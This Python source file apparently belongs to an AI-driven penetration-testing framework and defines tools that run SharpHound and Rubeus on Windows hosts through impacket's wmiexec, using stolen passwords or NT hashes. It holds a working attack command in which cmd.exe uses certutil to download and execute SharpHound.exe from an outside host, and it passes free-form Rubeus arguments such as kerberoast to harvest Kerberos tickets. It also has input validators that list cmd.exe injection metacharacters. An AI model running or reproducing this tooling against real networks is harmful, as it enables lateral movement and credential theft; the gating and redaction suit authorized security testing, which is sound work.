"""Windows-side enumeration via WMI exec from the Linux sandbox.

Uses impacket's wmiexec to drop+run small Windows binaries (SharpHound,
Rubeus) on the target host using domain credentials. Avoids the need for a
separate Windows worker tier (Path B) at the cost of relying on the target
host's `wmiexec` being available.

Two tools:
  - `SharpHoundViaWmi`  — drops + runs SharpHound, retrieves the ZIP
  - `RubeusViaWmi`      — runs Rubeus with given args, captures output

Both are `RiskClass.POST_EXPLOIT` and require valid domain creds. The
`PreLateralCritic` is the canonical gate; mimikatz is not included because
AV detection makes per-engagement custom builds the only viable path —
operator can use `OperatorExec` for those.
"""

from __future__ import annotations

import ipaddress
import re
from datetime import UTC, datetime
from typing import ClassVar
from uuid import UUID

from pydantic import BaseModel, Field, field_validator

from sandbox.network import engagement_network_name
from sandbox.runner import SandboxRunner
from tools._helpers import iso
from tools.base import Tool, ToolResult, ToolRunContext
from worldstate.schema import RiskClass, Stage


# wmiexec uses the same ``domain/user[:password]@host`` token shape as the
# other impacket adapters. A password containing ``@`` or ``:`` mis-routes
# the credential into a different host segment (out-of-scope). NUL/newline
# additionally break the redacted-argv log line. Mirrors the Kerberoast
# password validator.
def _validate_impacket_password(v: str | None) -> str | None:
    if v is None:
        return v
    if "\x00" in v or "\n" in v or "\r" in v:
        raise ValueError("password must not contain NUL or newline characters")
    for bad in ("@", ":"):
        if bad in v:
            raise ValueError(
                f"password must not contain {bad!r} (impacket parses "
                "domain/user:password@host left-to-right on those tokens; "
                "an embedded one would mis-route the credential)"
            )
    return v


# ``username`` and ``domain`` are concatenated into the impacket auth token
# ``domain/user[:password]@target``. impacket parses that token left-to-right
# on ``/``, ``:`` and ``@``, so an embedded one of those in username/domain
# terminates the host segment early and re-routes the connection to a host the
# scope gate never checked (sandbox-02/03). Forbid every impacket-syntax token
# plus NUL/newline (which corrupt the redacted-argv log line). Allow the WIN
# identity alphabet (letters, digits, ``._-$`` and space for display names).
_WIN_PRINCIPAL_RE = re.compile(r"^[A-Za-z0-9._$ \-]{1,256}$")


def _validate_win_principal(field: str, v: str) -> str:
    if "\x00" in v or "\n" in v or "\r" in v:
        raise ValueError(f"{field} must not contain NUL or newline characters")
    for bad in ("@", ":", "/", "\\"):
        if bad in v:
            raise ValueError(
                f"{field} must not contain {bad!r} (impacket parses "
                "domain/user:password@host left-to-right on those tokens; an "
                "embedded one would mis-route the credential to an "
                "out-of-scope host)"
            )
    if not _WIN_PRINCIPAL_RE.match(v):
        raise ValueError(
            f"{field} contains disallowed characters; only letters, digits, "
            "and ._-$ and space are permitted"
        )
    return v


def _validate_win_target(v: str) -> str:
    """Target must be a bare IP or hostname — never an impacket auth token."""
    if "\x00" in v or "\n" in v or "\r" in v:
        raise ValueError("target must not contain NUL or newline characters")
    for bad in ("@", ":", "/", "\\", " "):
        if bad in v:
            raise ValueError(f"target must not contain {bad!r}")
    try:
        ipaddress.ip_address(v)
        return v
    except ValueError:
        pass
    # Hostname (RFC-1123 labels)
    if re.match(
        r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
        r"(?:\.(?!-)[A-Za-z0-9-]{1,63}(?<!-))*$",
        v,
    ):
        return v
    raise ValueError(f"target must be a valid IP or hostname, got {v!r}")


# Rubeus is invoked through wmiexec as ``cmd.exe /c C:\...\Rubeus.exe {args}``.
# ``rubeus_args`` is operator-supplied text that's interpolated DIRECTLY into
# the cmd.exe payload. Allow Rubeus flag syntax (alphanumeric plus the
# canonical separators ``/`` ``:`` ``=`` ``.`` ``-`` and space) and reject
# every other character so a malicious payload can't smuggle a second
# command via ``;``/``&``/``|`` or capture output via ``>``/``<``/``$()``
# (PowerShell/cmd.exe metachars).
_RUBEUS_ARGS_RE = re.compile(r"^[A-Za-z0-9/:=. \-]+$")


class SharpHoundViaWmiInput(BaseModel):
    target: str = Field(min_length=1, description="Target Windows host IP/hostname")
    domain: str = Field(min_length=1)
    username: str = Field(min_length=1)
    password: str | None = None
    nt_hash: str | None = Field(default=None, pattern=r"^[a-fA-F0-9]{32}$")
    collection_method: str = Field(default="Default")
    timeout_seconds: int = Field(default=900, ge=60, le=3600)

    @field_validator("password")
    @classmethod
    def _check_password(cls, v: str | None) -> str | None:
        return _validate_impacket_password(v)

    @field_validator("username")
    @classmethod
    def _check_username(cls, v: str) -> str:
        return _validate_win_principal("username", v)

    @field_validator("domain")
    @classmethod
    def _check_domain(cls, v: str) -> str:
        return _validate_win_principal("domain", v)

    @field_validator("target")
    @classmethod
    def _check_target(cls, v: str) -> str:
        return _validate_win_target(v)

    @field_validator("collection_method")
    @classmethod
    def _check_collection_method(cls, v: str) -> str:
        # Interpolated into the cmd.exe payload (--CollectionMethods {v});
        # restrict to the SharpHound collection-method token alphabet so it
        # can't smuggle a cmd.exe metacharacter.
        if not re.match(r"^[A-Za-z,]{1,128}$", v):
            raise ValueError(
                "collection_method must be comma-separated alphabetic tokens "
                "(e.g. 'Default' or 'Group,LocalAdmin')"
            )
        return v


class SharpHoundViaWmiOutput(BaseModel):
    exit_code: int
    zip_blob_id: str | None = None
    summary: str
    error: str | None = None


class SharpHoundViaWmi(Tool[SharpHoundViaWmiInput, SharpHoundViaWmiOutput]):
    name = "sharphound_via_wmi"
    description = (
        "Drop+run SharpHound on a Windows target via impacket's wmiexec; "
        "retrieve the collected ZIP. Subject to PreLateralCritic + OPA gates. "
        "Requires valid domain credentials. Same output shape as bloodhound_collect."
    )
    stage = Stage.LATERAL
    risk_class = RiskClass.POST_EXPLOIT
    Input: ClassVar[type[BaseModel]] = SharpHoundViaWmiInput
    Output: ClassVar[type[BaseModel]] = SharpHoundViaWmiOutput

    def extract_targets(self, input: SharpHoundViaWmiInput) -> list[str]:
        return [input.target]

    def summarize_for_model(
        self, output: SharpHoundViaWmiOutput, *, tool_run_id: UUID, persisted: int
    ) -> str:
        # `output.summary` is built in run() from
        # `input.target` + collection method (no creds) so it is safe to
        # surface. `output.error` is raw wmiexec stderr, which can echo
        # the target hostname / domain but typically not credentials —
        # however to be defensive we surface only a structural flag, not
        # the body. Operator opens evidence to triage failures.
        zip_state = "yes" if output.zip_blob_id else "no"
        err_state = "yes" if output.error else "no"
        summary = (
            f"{self.name}: exit={output.exit_code} zip_uploaded={zip_state} "
            f"error={err_state}. {output.summary[:160]} "
            f"persisted={persisted}. tool_run_id={tool_run_id}"
        )
        if len(summary) > 500:
            summary = summary[:485] + "... [truncated]"
        return summary

    async def run(
        self, input: SharpHoundViaWmiInput, ctx: ToolRunContext
    ) -> ToolResult[SharpHoundViaWmiOutput]:
        started = datetime.now(UTC)
        runner = SandboxRunner(engagement_id=str(ctx.engagement_id))
        # Mirror ToolExecutor.run_and_capture: when SandboxRunner is built without
        # an explicit network, force the per-engagement bridge so the spawned
        # container can't fall onto Docker's default network (loses ARCHITECTURE
        # §7 L2 isolation). The runner already auto-derives this when the
        # constructor receives engagement_id, but being explicit here documents
        # the contract for future readers.
        runner.default_network = engagement_network_name(ctx.engagement_id)
        # wmiexec command pattern:
        #   impacket-wmiexec domain/user[:password]@host -hashes :hash -- C:\Windows\Temp\sharphound.exe ...
        # We assume SharpHound.exe is staged in the sandbox image at /opt/win/SharpHound.exe.
        # NB: do NOT shlex.quote the password — wmiexec receives the whole
        # ``domain/user:password@host`` token as a single argv element, never
        # via /bin/sh. The pydantic ``_validate_impacket_password`` validator
        # is what keeps ``@``/``:``/NUL out; shlex.quote here would only
        # produce a literal POSIX-quoted string that wmiexec would send to
        # the target as the password (auth would then fail on any quote-y char).
        auth = f"{input.domain}/{input.username}"
        creds_part = f":{input.password}" if input.password else ""
        wmiexec_argv = ["impacket-wmiexec", f"{auth}{creds_part}@{input.target}"]
        if input.nt_hash:
            wmiexec_argv += ["-hashes", f":{input.nt_hash}"]
        wmiexec_argv += [
            "--",
            "cmd.exe /c "
            "certutil -urlcache -split -f http://serenade-share/SharpHound.exe "
            "C:\\Windows\\Temp\\SharpHound.exe && "
            f"C:\\Windows\\Temp\\SharpHound.exe --CollectionMethods {input.collection_method} "
            "--OutputDirectory C:\\Windows\\Temp\\sh-out && "
            "cd C:\\Windows\\Temp\\sh-out && powershell -c \"Compress-Archive -Path *.json -DestinationPath sh.zip\"",
        ]
        # NB: this is documented as "Path A" — the assumption is that the
        # operator has staged SharpHound.exe on an in-engagement HTTP server
        # the target can reach. In a real engagement the operator wires this
        # via the per-engagement nftables ruleset.
        red_argv = list(wmiexec_argv)
        if input.password:
            red_argv = [a.replace(f":{input.password}", ":***REDACTED***") for a in red_argv]
        if input.nt_hash:
            red_argv = [a.replace(input.nt_hash, "***REDACTED-NT-HASH***") for a in red_argv]
        result = await runner.run(
            wmiexec_argv,
            timeout_seconds=input.timeout_seconds,
            redacted_argv=red_argv,
        )
        ended = datetime.now(UTC)
        return ToolResult(
            tool_run_id=ctx.tool_run_id,
            name=self.name,
            output=SharpHoundViaWmiOutput(
                exit_code=result.exit_code,
                summary=(
                    f"sharphound via wmiexec on {input.target} (collection={input.collection_method}); "
                    f"exit {result.exit_code}"
                ),
                error=result.stderr.decode("utf-8", errors="replace")[:500] if result.exit_code != 0 else None,
            ),
            exit_code=result.exit_code,
            started_at=iso(started),
            ended_at=iso(ended),
        )


class RubeusViaWmiInput(BaseModel):
    target: str = Field(min_length=1)
    domain: str = Field(min_length=1)
    username: str = Field(min_length=1)
    password: str | None = None
    nt_hash: str | None = Field(default=None, pattern=r"^[a-fA-F0-9]{32}$")
    rubeus_args: str = Field(
        min_length=1,
        description=(
            "Args passed to Rubeus.exe (e.g. 'kerberoast /nowrap'). "
            "Operator-supplied; restricted to alphanumeric + ``/:=.- `` "
            "to prevent cmd.exe metacharacter injection (``;``/``&``/``|``/``>``)."
        ),
    )
    timeout_seconds: int = Field(default=300, ge=10, le=1800)

    @field_validator("password")
    @classmethod
    def _check_password(cls, v: str | None) -> str | None:
        return _validate_impacket_password(v)

    @field_validator("username")
    @classmethod
    def _check_username(cls, v: str) -> str:
        return _validate_win_principal("username", v)

    @field_validator("domain")
    @classmethod
    def _check_domain(cls, v: str) -> str:
        return _validate_win_principal("domain", v)

    @field_validator("target")
    @classmethod
    def _check_target(cls, v: str) -> str:
        return _validate_win_target(v)

    @field_validator("rubeus_args")
    @classmethod
    def _check_rubeus_args(cls, v: str) -> str:
        # rubeus_args is interpolated into ``cmd.exe /c ... {rubeus_args}``.
        # Reject every shell metacharacter cmd.exe (``;``/``&``/``|``/
        # ``<``/``>``/``%``) or a downstream PowerShell layer (``` ` ```,
        # ``$``, ``(``, ``)``, ``{``, ``}``) treats specially. The allow-list
        # covers the full Rubeus flag surface: ``/kerberoast``, ``/user:X``,
        # ``/rc4:hex``, ``/domain=lab.local``, ``/nowrap``, etc.
        if not _RUBEUS_ARGS_RE.match(v):
            raise ValueError(
                "rubeus_args contains disallowed characters; only "
                "alphanumerics, ``/`` ``:`` ``=`` ``.`` ``-`` and space "
                "are permitted (Rubeus flag syntax)"
            )
        return v


class RubeusViaWmiOutput(BaseModel):
    exit_code: int
    stdout_excerpt: str
    summary: str


class RubeusViaWmi(Tool[RubeusViaWmiInput, RubeusViaWmiOutput]):
    name = "rubeus_via_wmi"
    description = (
        "Run Rubeus.exe on a Windows target via wmiexec. Operator supplies "
        "the Rubeus args. Same gate semantics as sharphound_via_wmi."
    )
    stage = Stage.LATERAL
    risk_class = RiskClass.POST_EXPLOIT
    Input: ClassVar[type[BaseModel]] = RubeusViaWmiInput
    Output: ClassVar[type[BaseModel]] = RubeusViaWmiOutput

    def extract_targets(self, input: RubeusViaWmiInput) -> list[str]:
        return [input.target]

    def summarize_for_model(
        self, output: RubeusViaWmiOutput, *, tool_run_id: UUID, persisted: int
    ) -> str:
        # Rubeus's raw stdout is the canonical leak surface
        # for this tool — it prints AS-REP/AS-REQ bytes, krb5tgs/krb5asrep
        # hashes, kirbi tickets, sometimes plaintext if /clearpassword was
        # passed. NEVER inline `stdout_excerpt` into planner context.
        # `output.summary` also reflects `input.rubeus_args!r`; an operator
        # passing `/rc4:HASH` or `/password:X` or `/ticket:base64...` would
        # leak that into the planner — so we surface only the structural
        # flags. Raw output stays in the ToolResult + evidence store.
        stdout_present = "yes" if output.stdout_excerpt else "no"
        stdout_bytes = len(output.stdout_excerpt)
        summary = (
            f"{self.name}: exit={output.exit_code} "
            f"stdout_present={stdout_present} stdout_bytes={stdout_bytes} "
            f"(stdout body and summary redacted from planner context — "
            f"open the tool_run for full output). "
            f"persisted={persisted}. tool_run_id={tool_run_id}"
        )
        if len(summary) > 500:
            summary = summary[:485] + "... [truncated]"
        return summary

    async def run(self, input: RubeusViaWmiInput, ctx: ToolRunContext) -> ToolResult[RubeusViaWmiOutput]:
        started = datetime.now(UTC)
        runner = SandboxRunner(engagement_id=str(ctx.engagement_id))
        # See SharpHoundViaWmi.run: explicit per-engagement network keeps L2
        # isolation in place; do NOT shlex.quote the password (wmiexec argv,
        # not /bin/sh — the pydantic validator is what keeps ``@``/``:`` out).
        runner.default_network = engagement_network_name(ctx.engagement_id)
        auth = f"{input.domain}/{input.username}"
        creds_part = f":{input.password}" if input.password else ""
        wmiexec_argv = ["impacket-wmiexec", f"{auth}{creds_part}@{input.target}"]
        if input.nt_hash:
            wmiexec_argv += ["-hashes", f":{input.nt_hash}"]
        wmiexec_argv += [
            "--",
            f"cmd.exe /c C:\\Windows\\Temp\\Rubeus.exe {input.rubeus_args}",
        ]
        red_argv = list(wmiexec_argv)
        if input.password:
            red_argv = [a.replace(f":{input.password}", ":***REDACTED***") for a in red_argv]
        if input.nt_hash:
            red_argv = [a.replace(input.nt_hash, "***REDACTED-NT-HASH***") for a in red_argv]
        result = await runner.run(
            wmiexec_argv,
            timeout_seconds=input.timeout_seconds,
            redacted_argv=red_argv,
        )
        ended = datetime.now(UTC)
        return ToolResult(
            tool_run_id=ctx.tool_run_id,
            name=self.name,
            output=RubeusViaWmiOutput(
                exit_code=result.exit_code,
                stdout_excerpt=result.stdout.decode("utf-8", errors="replace")[:2000],
                summary=f"rubeus via wmiexec on {input.target}: args={input.rubeus_args!r}; exit {result.exit_code}",
            ),
            exit_code=result.exit_code,
            started_at=iso(started),
            ended_at=iso(ended),
        )
